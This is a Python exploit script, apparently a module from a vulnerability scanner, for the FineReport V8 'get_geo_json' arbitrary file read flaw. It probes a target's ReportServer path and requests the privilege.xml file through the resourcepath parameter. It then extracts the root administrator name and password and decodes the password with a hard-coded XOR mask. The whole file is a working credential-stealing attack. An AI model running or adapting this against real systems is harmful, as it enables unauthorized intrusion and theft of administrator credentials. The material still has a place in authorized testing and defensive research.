import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import re

def decode_passwd(cipher):
    PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23]  # 掩码
    Password = ""
    cipher = cipher[3:]  # 截断三位后
    for i in range(int(len(cipher) / 4)):
        c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
        c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
        Password = Password + chr(c2)
    return Password

def POC_1(target_url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        vuln_url_1 = target_url + '/WebReport/ReportServer'
        vuln_url_2 = target_url + '/ReportServer'
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response_1 = requests.get(url=vuln_url_1, timeout=5, verify=False, headers=headers)
        response_2 = requests.get(url=vuln_url_2, timeout=5, verify=False, headers=headers)
        if "部署页面" in response_1.text:
            print(Vcolors.RED + "[+] 目标部署页面为:{}".format(vuln_url_1)+ Vcolors.ENDC)
            POC_2(vuln_url_1)
        elif "部署页面" in response_2.text:
            print(Vcolors.RED + "[+] 目标部署页面为:{}".format(vuln_url_2) + Vcolors.ENDC)
            POC_2(vuln_url_2)
        else:
            print(Vcolors.WARNING + "[x] 帆软报表 V8  任意文件读取漏洞不存在" + Vcolors.ENDC)

    except:
        print(Vcolors.WARNING + "[x] 无法利用poc请求目标或被目标拒绝请求" + Vcolors.ENDC)

def POC_2(vuln_url_fileread):
    vuln_url = vuln_url_fileread + "?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, verify=False, timeout=5)
        if ("rootManagerPassword" in response.text) and (response.status_code) == 200:
            print(Vcolors.RED + "[+] 目标存在漏洞,读取敏感文件:{}".format(response.text)+Vcolors.ENDC)
            user_name = re.findall(r'<!\[CDATA\[(.*?)]]></rootManagerName>', response.text)
            cipher = re.findall(r'<!\[CDATA\[(.*?)]]></rootManagerPassword>', response.text)
            password = decode_passwd(cipher[0])
            print(Vcolors.RED + "[+] 后台账户密码为:{} {}".format(user_name[0],password)+Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 帆软报表 V8  任意文件读取漏洞不存在" + Vcolors.ENDC)
    except:
        print(Vcolors.WARNING + "[x] 无法利用poc请求目标或被目标拒绝请求" + Vcolors.ENDC)


def 帆软_v8_get_json_任意文件读取(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    try:
        POC_1(urldata)
    except:
        logging.error("帆软_v8_get_json_任意文件读取脚本出现异常")


